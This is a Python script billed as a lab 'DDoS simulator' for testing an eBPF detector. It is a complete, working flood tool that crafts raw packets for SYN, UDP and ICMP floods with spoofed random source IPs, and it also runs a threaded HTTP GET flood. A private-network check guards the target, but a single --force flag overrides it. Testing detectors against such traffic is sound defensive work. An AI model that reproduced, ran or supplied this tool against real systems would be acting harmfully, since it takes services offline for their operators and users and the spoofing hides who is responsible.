#!/usr/bin/env python3
"""
ddos_simulator.py - A controlled DDoS traffic simulator for the lab.

This is the "DDoS server" side of the experiment. It generates flood traffic
against the target server so you can watch the XDP/eBPF detector catch it.
Unlike attack_sim.sh (which shells out to hping3), this is a self-contained
Python program so you can read and understand exactly how each attack is built.

Attack modes
------------
  syn   TCP SYN flood  - raw sockets, spoofed random source IPs (needs root)
  udp   UDP flood      - raw sockets, spoofed random source IPs (needs root)
  icmp  ICMP ping flood - raw sockets, spoofed random source IPs (needs root)
  http  HTTP GET flood - many real requests to the web server (no root needed)

============================ AUTHORIZED USE ONLY ============================
Run ONLY against a target you own, on an isolated/private network. Flooding
machines you do not control is illegal. This exists to test your own detector.
===========================================================================

Examples
--------
  sudo python3 ddos_simulator.py 192.168.56.10 --mode syn  --duration 20
  sudo python3 ddos_simulator.py 192.168.56.10 --mode udp  --port 53 -t 8
       python3 ddos_simulator.py 192.168.56.10 --mode http --port 8080
"""
import argparse
import ipaddress
import random
import socket
import struct
import sys
import threading
import time

# Shared counters across worker threads.
packets_sent = 0
counter_lock = threading.Lock()
stop_flag = threading.Event()


def bump(n=1):
    global packets_sent
    with counter_lock:
        packets_sent += n


# --------------------------------------------------------------------------
# Low-level packet construction (IPv4 checksum + spoofed headers)
# --------------------------------------------------------------------------
def checksum(data: bytes) -> int:
    """Standard Internet checksum (RFC 1071), little-endian accumulation as
    used on x86. Returns the 16-bit ones-complement value."""
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += data[i] + (data[i + 1] << 8)
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def random_ip() -> str:
    """A random, non-reserved-looking source IP to spoof."""
    return "%d.%d.%d.%d" % (
        random.randint(1, 223),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(1, 254),
    )


def ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int) -> bytes:
    """Build a 20-byte IPv4 header. With IPPROTO_RAW the kernel fills in the
    checksum and total length when they are zero, but we set them anyway."""
    version_ihl = (4 << 4) | 5
    total_len = 20 + payload_len
    ident = random.randint(0, 65535)
    ttl = 64
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, total_len, ident, 0, ttl, proto, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    chk = checksum(hdr)
    return struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, total_len, ident, 0, ttl, proto, chk,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )


def tcp_syn_segment(src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    """Build a TCP segment with only the SYN flag set."""
    seq = random.randint(0, 0xFFFFFFFF)
    offset_res = (5 << 4)          # data offset = 5 words, no options
    flags = 0x02                   # SYN
    window = socket.htons(5840)
    tcp_hdr = struct.pack("!HHLLBBHHH", sport, dport, seq, 0,
                          offset_res, flags, window, 0, 0)
    # TCP checksum is computed over a pseudo-header + the segment.
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src_ip),
                         socket.inet_aton(dst_ip), 0,
                         socket.IPPROTO_TCP, len(tcp_hdr))
    chk = checksum(pseudo + tcp_hdr)
    return struct.pack("!HHLLBBH", sport, dport, seq, 0,
                       offset_res, flags, window) + struct.pack("H", chk) \
        + struct.pack("!H", 0)


def icmp_echo(payload: bytes) -> bytes:
    """Build an ICMP echo-request packet."""
    header = struct.pack("!BBHHH", 8, 0, 0, random.randint(0, 0xFFFF), 1)
    chk = checksum(header + payload)
    return struct.pack("!BBHHH", 8, 0, chk,
                       random.randint(0, 0xFFFF), 1) + payload


# --------------------------------------------------------------------------
# Worker loops (one per thread)
# --------------------------------------------------------------------------
def raw_flood_worker(target: str, port: int, mode: str, spoof: bool, pps: int):
    """Send crafted spoofed packets on a raw socket until stop_flag is set."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("error: raw sockets need root. Re-run with sudo, "
              "or use --mode http.", file=sys.stderr)
        stop_flag.set()
        return

    payload = b"x" * 32
    interval = 1.0 / pps if pps else 0

    while not stop_flag.is_set():
        src = random_ip() if spoof else socket.gethostbyname(socket.gethostname())
        sport = random.randint(1024, 65535)
        if mode == "syn":
            pkt = ip_header(src, target, socket.IPPROTO_TCP,
                            20) + tcp_syn_segment(src, target, sport, port)
        elif mode == "udp":
            udp = struct.pack("!HHHH", sport, port, 8 + len(payload), 0) + payload
            pkt = ip_header(src, target, socket.IPPROTO_UDP,
                            len(udp)) + udp
        else:  # icmp
            icmp = icmp_echo(payload)
            pkt = ip_header(src, target, socket.IPPROTO_ICMP, len(icmp)) + icmp
        try:
            sock.sendto(pkt, (target, 0))
            bump()
        except OSError:
            pass
        if interval:
            time.sleep(interval)


def http_flood_worker(target: str, port: int, pps: int):
    """Open real TCP connections and fire HTTP GETs (application-layer flood).
    Works without root; exercises the whole stack, not just the NIC."""
    request = ("GET / HTTP/1.1\r\nHost: %s\r\n"
               "User-Agent: ddos-sim\r\n\r\n" % target).encode()
    interval = 1.0 / pps if pps else 0
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            s.sendall(request)
            bump()
            s.close()
        except OSError:
            bump()  # count the attempt even if the server is overwhelmed
        if interval:
            time.sleep(interval)


# --------------------------------------------------------------------------
# Orchestration
# --------------------------------------------------------------------------
def is_private(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def main():
    ap = argparse.ArgumentParser(description="Controlled DDoS simulator (lab only)")
    ap.add_argument("target", help="target IP (the server under attack)")
    ap.add_argument("--mode", choices=["syn", "udp", "icmp", "http"],
                    default="syn", help="attack type (default: syn)")
    ap.add_argument("--port", type=int, default=80, help="target port (default 80)")
    ap.add_argument("-t", "--threads", type=int, default=4,
                    help="number of parallel workers (default 4)")
    ap.add_argument("-d", "--duration", type=int, default=20,
                    help="seconds to run (default 20)")
    ap.add_argument("--pps", type=int, default=0,
                    help="per-thread packets/sec cap (0 = as fast as possible)")
    ap.add_argument("--no-spoof", action="store_true",
                    help="use the real source IP instead of random spoofed IPs")
    ap.add_argument("--force", action="store_true",
                    help="allow a non-private target (you must be authorized!)")
    args = ap.parse_args()

    try:
        socket.inet_aton(args.target)
    except OSError:
        print("error: target must be an IPv4 address", file=sys.stderr)
        return 1

    if not is_private(args.target) and not args.force:
        print("Refusing non-private target %s.\n"
              "Only attack a lab machine you own. Use --force if you are "
              "certain you are authorized." % args.target, file=sys.stderr)
        return 1

    spoof = not args.no_spoof and args.mode != "http"
    print("=" * 60)
    print(" DDoS SIMULATOR  (authorized lab testing only)")
    print(" target   : %s:%d" % (args.target, args.port))
    print(" mode     : %s" % args.mode)
    print(" threads  : %d   duration: %ds   spoof: %s"
          % (args.threads, args.duration, spoof))
    print("=" * 60)

    threads = []
    for _ in range(args.threads):
        if args.mode == "http":
            th = threading.Thread(target=http_flood_worker,
                                  args=(args.target, args.port, args.pps))
        else:
            th = threading.Thread(target=raw_flood_worker,
                                  args=(args.target, args.port, args.mode,
                                        spoof, args.pps))
        th.daemon = True
        th.start()
        threads.append(th)

    # Live progress: print the send rate once a second.
    start = time.time()
    last_count = 0
    try:
        while time.time() - start < args.duration and not stop_flag.is_set():
            time.sleep(1)
            with counter_lock:
                total = packets_sent
            rate = total - last_count
            last_count = total
            print("  sent: %-12d  rate: %d pkts/s" % (total, rate))
    except KeyboardInterrupt:
        print("\ninterrupted.")
    finally:
        stop_flag.set()
        time.sleep(0.3)

    print("-" * 60)
    print(" finished. total packets/requests sent: %d" % packets_sent)
    print(" check the detector dashboard on the target server.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
